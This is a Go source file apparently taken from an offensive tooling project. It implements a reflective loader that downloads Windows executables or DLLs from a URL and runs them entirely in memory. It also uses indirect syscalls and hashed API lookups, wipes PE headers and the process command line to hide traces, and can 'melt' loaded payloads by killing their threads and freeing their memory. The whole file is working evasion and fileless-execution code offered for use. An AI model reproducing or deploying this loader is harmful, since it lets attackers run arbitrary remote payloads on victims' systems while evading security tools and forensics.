package pe

import (
	"fmt"
	"strings"
	"sync"
	"time"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

type DownloadFunc func(url string) ([]byte, error)

type Mapping struct {
	BaseAddr uintptr
	Size     uint32
	IsDLL    bool
}

var (
	dllMappings   = make(map[uintptr]*Mapping)
	peMappings    = make(map[uintptr]*Mapping)
	mappingsMutex sync.RWMutex
)

func loadPeInternal(peBytes []byte) uintptr {
	dosHeader := (*[64]byte)(unsafe.Pointer(&peBytes[0]))
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return 0
	}
	peOffset := *(*uint32)(unsafe.Pointer(&peBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&peBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))
	sizeOfHeaders := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x3C))
	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	var baseAddr uintptr
	var regionSize uintptr = uintptr(sizeOfImage)
	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), 0, uintptr(unsafe.Pointer(&regionSize)), 0x00001000|0x00002000, 0x04)
	if ret != 0 {
		fmt.Printf("[+] ret 0x%x\n", ret)
		return 0
	}
	dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), sizeOfHeaders)
	srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(&peBytes[0])), sizeOfHeaders)
	copy(dstSlice, srcSlice)
	peOffset = *(*uint32)(unsafe.Pointer(&peBytes[60]))
	peHeaderAddr = uintptr(unsafe.Pointer(&peBytes[peOffset]))
	numSections := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
	sizeOfOptHeader := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))

	for i := uint16(0); i < numSections; i++ {
		sectionFileHeader := uintptr(unsafe.Pointer(&peBytes[0])) + uintptr(peOffset) + 0x18 + uintptr(sizeOfOptHeader) + uintptr(i*40)

		virtualAddress := *(*uint32)(unsafe.Pointer(sectionFileHeader + 0x0C))
		sizeOfRawData := *(*uint32)(unsafe.Pointer(sectionFileHeader + 0x10))
		pointerToRawData := *(*uint32)(unsafe.Pointer(sectionFileHeader + 0x14))

		if sizeOfRawData == 0 {
			continue
		}
		dest := baseAddr + uintptr(virtualAddress)
		src := uintptr(unsafe.Pointer(&peBytes[pointerToRawData]))
		dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dest)), sizeOfRawData)
		srcSlice := unsafe.Slice((*byte)(unsafe.Pointer(src)), sizeOfRawData)
		copy(dstSlice, srcSlice)
	}

	peHeaderAddrInMem := baseAddr + uintptr(peOffset)
	optHeaderAddrInMem := peHeaderAddrInMem + 0x18
	imageBase := uintptr(*(*uint64)(unsafe.Pointer(optHeaderAddrInMem + 0x18)))

	delta := int64(baseAddr) - int64(imageBase)

	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	optHeaderAddr = peHeaderAddr + 0x18
	relocDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (5 * 8)))
	relocDirSize := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (5 * 8) + 4))
	if relocDirRVA == 0 || relocDirSize == 0 {
		fmt.Println("[+] no relocations needed")
		return baseAddr
	}
	relocDir := baseAddr + uintptr(relocDirRVA)
	relocEnd := relocDir + uintptr(relocDirSize)
	for relocDir < relocEnd {
		pageRVA := *(*uint32)(unsafe.Pointer(relocDir))
		blockSize := *(*uint32)(unsafe.Pointer(relocDir + 4))
		if blockSize == 0 || blockSize < 8 {
			break
		}
		entryCount := (blockSize - 8) / 2
		entries := relocDir + 8
		for i := uint32(0); i < entryCount; i++ {
			entry := *(*uint16)(unsafe.Pointer(entries + uintptr(i*2)))
			relocType := entry >> 12
			offset := entry & 0xFFF
			if relocType == 0 {
				continue
			}
			patchAddr := baseAddr + uintptr(pageRVA) + uintptr(offset)
			if relocType == 10 {
				oldValue := *(*uint64)(unsafe.Pointer(patchAddr))
				newValue := uint64(int64(oldValue) + delta)
				*(*uint64)(unsafe.Pointer(patchAddr)) = newValue
			} else if relocType == 3 {
				oldValue := *(*uint32)(unsafe.Pointer(patchAddr))
				newValue := uint32(int32(oldValue) + int32(delta))
				*(*uint32)(unsafe.Pointer(patchAddr)) = newValue
			}
		}
		relocDir += uintptr(blockSize)
	}

	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	optHeaderAddr = peHeaderAddr + 0x18
	importDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (1 * 8)))
	if importDirRVA == 0 {

	}

	k32Base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	exitThreadAddr := wc.GetFunctionAddress(k32Base, wc.GetHash("ExitThread"))

	importDesc := baseAddr + uintptr(importDirRVA)
	for {
		originalFirstThunk := *(*uint32)(unsafe.Pointer(importDesc + 0x00))
		nameRVA := *(*uint32)(unsafe.Pointer(importDesc + 0x0C))
		firstThunk := *(*uint32)(unsafe.Pointer(importDesc + 0x10))
		if nameRVA == 0 {
			break
		}
		dllNameAddr := baseAddr + uintptr(nameRVA)
		length := 0
		for {
			c := *(*byte)(unsafe.Pointer(dllNameAddr + uintptr(length)))
			if c == 0 {
				break
			}
			length++
		}
		dllName := string(unsafe.Slice((*byte)(unsafe.Pointer(dllNameAddr)), length))

		hModule := wc.LoadLibraryLdr(dllName)
		if hModule == 0 {

			importDesc += 20
			continue
		}
		thunkRVA := originalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = firstThunk
		}

		thunkAddr := baseAddr + uintptr(thunkRVA)
		iatAddr := baseAddr + uintptr(firstThunk)
		for {
			thunkValue := *(*uint64)(unsafe.Pointer(thunkAddr))

			if thunkValue == 0 {
				break
			}

			var funcAddr uintptr
			var funcName string
			if (thunkValue & 0x8000000000000000) != 0 {
				ordinal := uint16(thunkValue & 0xFFFF)
				funcAddr, _, _ = wc.Call("kernel32.dll", "GetProcAddress", hModule, ordinal)
			} else {
				importByNameAddr := baseAddr + uintptr(thunkValue)
				funcNameAddr := importByNameAddr + 2
				length := 0
				for {
					c := *(*byte)(unsafe.Pointer(funcNameAddr + uintptr(length)))
					if c == 0 {
						break
					}
					length++
				}
				funcName = string(unsafe.Slice((*byte)(unsafe.Pointer(funcNameAddr)), length))
				funcAddr = wc.GetFunctionAddress(hModule, wc.GetHash(funcName))
			}

			if funcAddr == 0 {

			}

			if funcName == "exit" || funcName == "ExitProcess" || funcName == "_exit" || funcName == "_Exit" || funcName == "quick_exit" {
				funcAddr = exitThreadAddr
			}

			*(*uint64)(unsafe.Pointer(iatAddr)) = uint64(funcAddr)
			thunkAddr += 8
			iatAddr += 8
		}
		importDesc += 20
	}

	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	optHeaderAddr = peHeaderAddr + 0x18

	magic := *(*uint16)(unsafe.Pointer(optHeaderAddr))
	is64bit := magic == 0x020B

	var dataDirOffset uintptr
	if is64bit {
		dataDirOffset = 0x70
	} else {
		dataDirOffset = 0x60
	}

	tlsDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + dataDirOffset + (9 * 8)))

	if tlsDirRVA == 0 {

	}
	tlsDir := baseAddr + uintptr(tlsDirRVA)
	var callbacksVA uint64
	if is64bit {
		callbacksVA = *(*uint64)(unsafe.Pointer(tlsDir + 0x18))
	} else {
		callbacksVA = uint64(*(*uint32)(unsafe.Pointer(tlsDir + 0x0C)))
	}
	if callbacksVA == 0 {

	}
	if callbacksVA > uint64(baseAddr) && callbacksVA < uint64(baseAddr+0x10000000) {
		callbackArrayAddr := uintptr(callbacksVA)
		index := 0
		for {
			var callbackVA uint64
			if is64bit {
				callbackVA = *(*uint64)(unsafe.Pointer(callbackArrayAddr + uintptr(index*8)))
			} else {
				callbackVA = uint64(*(*uint32)(unsafe.Pointer(callbackArrayAddr + uintptr(index*4))))
			}

			if callbackVA == 0 {
				break
			}

			wc.CallG0(uintptr(callbackVA), baseAddr, 1, 0)

			index++
		}
	}
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr = baseAddr + uintptr(peOffset)
	numSections = *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
	sizeOfOptHeader = *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))
	sectionHeaderAddr := peHeaderAddr + 0x18 + uintptr(sizeOfOptHeader)

	for i := uint16(0); i < numSections; i++ {
		sectionHeader := sectionHeaderAddr + uintptr(i*40)

		virtualSize := *(*uint32)(unsafe.Pointer(sectionHeader + 0x08))
		virtualAddress := *(*uint32)(unsafe.Pointer(sectionHeader + 0x0C))
		characteristics := *(*uint32)(unsafe.Pointer(sectionHeader + 0x24))

		if virtualSize == 0 {
			continue
		}

		sectionAddr := baseAddr + uintptr(virtualAddress)
		var protection uint32
		if (characteristics & 0x20000000) != 0 {
			if (characteristics & 0x80000000) != 0 {
				protection = 0x40
			} else {
				protection = 0x20
			}
		} else {
			if (characteristics & 0x80000000) != 0 {
				protection = 0x04
			} else {
				protection = 0x02
			}
		}
		var oldProtect uint32
		ntProt := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
		currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
		var baseAddrPtr uintptr = sectionAddr
		var regionSizeVar uintptr = uintptr(virtualSize)
		ret, _ := wc.IndirectSyscall(
			ntProt.SSN,
			ntProt.Address,
			currProc,
			uintptr(unsafe.Pointer(&baseAddrPtr)),
			uintptr(unsafe.Pointer(&regionSizeVar)),
			uintptr(protection),
			uintptr(unsafe.Pointer(&oldProtect)))

		if ret != 0 {
			fmt.Printf("[-] ntprot returned 0x%x\n", ret)
		}
	}
	var tHandle uintptr
	peOffset = *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddrInMem = baseAddr + uintptr(peOffset)
	optHeaderAddrInMem = peHeaderAddrInMem + 0x18
	entryPointRVA := *(*uint32)(unsafe.Pointer(optHeaderAddrInMem + 0x10))
	entryPoint := baseAddr + uintptr(entryPointRVA)

	for i := uintptr(0); i < uintptr(sizeOfHeaders); i++ {
		*(*byte)(unsafe.Pointer(baseAddr + i)) = 0
	}

	ntdllBase := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	getPeb := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlGetCurrentPeb"))
	pebAddr, _, _ := wc.CallG0(getPeb)
	if pebAddr != 0 {
		processParamsOffset := uintptr(0x20)
		processParams := *(*uintptr)(unsafe.Pointer(pebAddr + processParamsOffset))
		if processParams != 0 {
			commandLineOffset := uintptr(0x70)
			commandLineUnicode := (*struct {
				Length        uint16
				MaximumLength uint16
				_             uint32
				Buffer        uintptr
			})(unsafe.Pointer(processParams + commandLineOffset))

			if commandLineUnicode.Buffer != 0 && commandLineUnicode.Length > 0 {
				cmdLineSlice := unsafe.Slice((*byte)(unsafe.Pointer(commandLineUnicode.Buffer)), commandLineUnicode.MaximumLength)
				for i := range cmdLineSlice {
					cmdLineSlice[i] = 0
				}
				commandLineUnicode.Length = 0
			}
		}
	}

	rtlCreateUserThread := wc.GetFunctionAddress(ntdllBase, wc.GetHash("RtlCreateUserThread"))
	ret, _, _ = wc.CallG0(rtlCreateUserThread, currProc, 0, 0, 0, 0, 0, entryPoint, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
	if ret != 0 {

	}
	wc.Call("kernel32.dll", "WaitForSingleObject", tHandle, 0xFFFFFFFF)
	return baseAddr
}

func LoadPe(peBytes []byte) {
	loadPeInternal(peBytes)
}

func LoadDLLFromURL(url string, exportSpec string, download DownloadFunc) (*Mapping, error) {
	dllBytes, err := download(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download DLL: %w", err)
	}

	if len(dllBytes) < 64 || dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE file")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dllBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&dllBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))

	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	baseAddr, err := LoadDLLRemote(currProc, dllBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to load DLL: %w", err)
	}

	if exportSpec != "" {
		exportName := exportSpec
		if strings.HasPrefix(exportSpec, "export_only:") {
			exportName = strings.TrimPrefix(exportSpec, "export_only:")
		}
		if exportName != "" {
			funcAddr := resolveExport(baseAddr, exportName)
			if funcAddr != 0 {
				wc.CallG0(funcAddr)
			}
		}
	}

	mapping := &Mapping{
		BaseAddr: baseAddr,
		Size:     sizeOfImage,
		IsDLL:    true,
	}

	mappingsMutex.Lock()
	dllMappings[baseAddr] = mapping
	mappingsMutex.Unlock()

	return mapping, nil
}

func resolveExport(baseAddr uintptr, exportName string) uintptr {
	peOffset := *(*uint32)(unsafe.Pointer(baseAddr + 60))
	peHeaderAddr := baseAddr + uintptr(peOffset)
	optHeaderAddr := peHeaderAddr + 0x18

	exportDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70))
	if exportDirRVA == 0 {
		return 0
	}

	exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(baseAddr + uintptr(exportDirRVA)))
	nameCount := exportDir.NumberOfNames
	if nameCount == 0 {
		return 0
	}

	namesRVA := baseAddr + uintptr(exportDir.AddressOfNames)
	ordinalsRVA := baseAddr + uintptr(exportDir.AddressOfNameOrdinals)
	functionsRVA := baseAddr + uintptr(exportDir.AddressOfFunctions)

	for i := uint32(0); i < nameCount; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(namesRVA + uintptr(i*4)))
		nameAddr := baseAddr + uintptr(nameRVA)

		length := 0
		for {
			c := *(*byte)(unsafe.Pointer(nameAddr + uintptr(length)))
			if c == 0 {
				break
			}
			length++
		}
		name := string(unsafe.Slice((*byte)(unsafe.Pointer(nameAddr)), length))
		if name == exportName {
			ordinal := *(*uint16)(unsafe.Pointer(ordinalsRVA + uintptr(i*2)))
			funcRVA := *(*uint32)(unsafe.Pointer(functionsRVA + uintptr(uint32(ordinal)*4)))
			return baseAddr + uintptr(funcRVA)
		}
	}
	return 0
}

func LoadPEFromUrl(url string, sleepSeconds int, download DownloadFunc) (*Mapping, error) {
	peBytes, err := download(url)
	if err != nil {
		return nil, fmt.Errorf("failed to download PE: %w", err)
	}

	if len(peBytes) < 64 || peBytes[0] != 'M' || peBytes[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE file")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&peBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&peBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))

	if sleepSeconds > 0 {
		time.Sleep(time.Duration(sleepSeconds) * time.Second)
	}

	baseAddr := loadPeInternal(peBytes)
	if baseAddr == 0 {
		return nil, fmt.Errorf("failed to load PE")
	}

	mapping := &Mapping{
		BaseAddr: baseAddr,
		Size:     sizeOfImage,
		IsDLL:    false,
	}

	mappingsMutex.Lock()
	peMappings[baseAddr] = mapping
	mappingsMutex.Unlock()

	return mapping, nil
}

func GetMap() ([]uintptr, []uint32, int) {
	mappingsMutex.RLock()
	defer mappingsMutex.RUnlock()

	count := len(dllMappings)
	baseAddrs := make([]uintptr, 0, count)
	sizes := make([]uint32, 0, count)

	for _, mapping := range dllMappings {
		baseAddrs = append(baseAddrs, mapping.BaseAddr)
		sizes = append(sizes, mapping.Size)
	}

	return baseAddrs, sizes, count
}

func GetPEMap() ([]uintptr, []uint32, int) {
	mappingsMutex.RLock()
	defer mappingsMutex.RUnlock()

	count := len(peMappings)
	baseAddrs := make([]uintptr, 0, count)
	sizes := make([]uint32, 0, count)

	for _, mapping := range peMappings {
		baseAddrs = append(baseAddrs, mapping.BaseAddr)
		sizes = append(sizes, mapping.Size)
	}

	return baseAddrs, sizes, count
}

func killThreadsInRange(base uintptr, size uint32) {
	const TH32CS_SNAPTHREAD = 0x00000004
	const THREAD_QUERY_INFORMATION = 0x0040
	const THREAD_TERMINATE = 0x0001
	const ThreadQuerySetWin32StartAddress = 9

	pid, _, _ := wc.Call("kernel32.dll", "GetCurrentProcessId")

	snap, _, _ := wc.Call("kernel32.dll", "CreateToolhelp32Snapshot", TH32CS_SNAPTHREAD, 0)
	if snap == 0 || snap == ^uintptr(0) {
		return
	}
	defer wc.Call("kernel32.dll", "CloseHandle", snap)

	var te ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	ok, _, _ := wc.Call("kernel32.dll", "Thread32First", snap, uintptr(unsafe.Pointer(&te)))
	if ok == 0 {
		return
	}

	ntQueryInfo := wc.GetSyscall(wc.GetHash("NtQueryInformationThread"))
	regionEnd := base + uintptr(size)

	for {
		if uintptr(te.OwnerProcessID) == pid {
			hThread, _, _ := wc.Call("kernel32.dll", "OpenThread",
				THREAD_QUERY_INFORMATION|THREAD_TERMINATE, 0, uintptr(te.ThreadID))
			if hThread != 0 {
				var startAddr uintptr
				ret, _ := wc.IndirectSyscall(ntQueryInfo.SSN, ntQueryInfo.Address,
					hThread, uintptr(ThreadQuerySetWin32StartAddress),
					uintptr(unsafe.Pointer(&startAddr)), unsafe.Sizeof(startAddr), 0)
				if ret == 0 && startAddr >= base && startAddr < regionEnd {
					wc.Call("kernel32.dll", "TerminateThread", hThread, 0)
				}
				wc.Call("kernel32.dll", "CloseHandle", hThread)
			}
		}

		ok, _, _ = wc.Call("kernel32.dll", "Thread32Next", snap, uintptr(unsafe.Pointer(&te)))
		if ok == 0 {
			break
		}
	}
}

func Melt(mapping *Mapping) error {
	if mapping == nil {
		return fmt.Errorf("nil mapping")
	}

	killThreadsInRange(mapping.BaseAddr, mapping.Size)

	mappingsMutex.Lock()
	delete(dllMappings, mapping.BaseAddr)
	mappingsMutex.Unlock()

	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	var baseAddr uintptr = mapping.BaseAddr
	var regionSize uintptr = 0

	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000)
	if ret != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
	}

	return nil
}

func MeltPE(mapping *Mapping) error {
	if mapping == nil {
		return fmt.Errorf("nil mapping")
	}

	killThreadsInRange(mapping.BaseAddr, mapping.Size)

	mappingsMutex.Lock()
	delete(peMappings, mapping.BaseAddr)
	mappingsMutex.Unlock()

	ntFree := wc.GetSyscall(wc.GetHash("NtFreeVirtualMemory"))
	currProc, _, _ := wc.Call("kernel32.dll", "GetCurrentProcess")
	var baseAddr uintptr = mapping.BaseAddr
	var regionSize uintptr = 0

	ret, _ := wc.IndirectSyscall(ntFree.SSN, ntFree.Address, currProc, uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSize)), 0x00008000)
	if ret != 0 {
		return fmt.Errorf("NtFreeVirtualMemory failed: 0x%x", ret)
	}

	return nil
}
